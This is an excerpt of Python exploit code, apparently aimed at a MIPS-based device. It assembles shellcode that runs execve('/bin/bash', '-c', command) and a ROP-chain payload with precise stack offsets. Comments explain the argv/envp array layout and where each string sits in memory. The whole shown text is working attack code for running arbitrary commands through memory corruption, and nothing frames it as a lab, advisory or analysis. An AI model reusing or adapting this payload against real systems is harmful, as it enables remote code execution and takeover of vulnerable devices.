...
def build_shellcode(shellCmd):
    ...
    shell_code += b'B' * (0x18 - ADDRESS_SIZE * 4)  # offset (we use part of this offset to store the array of pointers for execve)

    # these are the arguments for execve("/bin/bash", ["/bin/bash", "-c", "shellCmd"], [NULL])
    shell_code += b'\x00\x00\x00\x00'  # here the shell code will write the address of string "/bin/bash"                                                  <--- argv_array
    shell_code += b'\x00\x00\x00\x00'  # here the shell code will write the address of string "-c"
    shell_code += b'\x00\x00\x00\x00'  # here the shell code will write the address of string "shellCmd"
    shell_code += b'\x00\x00\x00\x00'  # this will remain NULL (used as part of second agument [end of argv_array], and as third argument [envp_array])    <--- envp_array
    ...
    shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         start execve("/bin/bash", ["/bin/bash", "-c", "shellCmd"], [NULL])
    
    shell_code += b'P' * 20           # offset to simplify string address calculation  
    shell_code += b'/bin/bash\x00'    # 10 byte                                         [shellcode_start + 0x40]      <--- bin_bash_address
    shell_code += b'P' * 6            # offset to simplify string address calculation
    shell_code += b'-c\x00'           # 3 byte                                          [shellcode_start + 0x50]      <--- c_address
    shell_code += b'P' * 13           # offset to simplify string address calculation
    shell_code += shellCmd + b'\x00'  # variable len                                    [shellcode_start + 0x60]      <--- shellCmd_address
...
def build_payload(shellCmd):
    ...
    ropChain += b'D' * (0x600 - ADDRESS_SIZE - len(shell_code)) # offset because of this: 0x600 + var_4($sp)
    ...
    ropChain += b'C' * (0x28 - 0x4) # offset because of this: 0x28 + var_4($sp) 
